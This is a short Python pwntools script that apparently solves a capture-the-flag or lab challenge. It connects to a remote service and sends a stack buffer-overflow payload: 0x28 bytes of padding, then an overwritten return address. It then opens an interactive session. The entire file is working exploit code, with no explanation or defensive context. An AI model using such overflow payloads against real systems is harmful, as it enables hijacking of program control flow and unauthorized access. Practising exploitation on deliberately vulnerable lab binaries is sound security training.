from pwn import *

conn = remote('up.zoolab.org', 30001)
payload = bytes("a", 'latin-1') * 0x28 + p64(0x4011e9)
conn.send(payload) 
conn.interactive()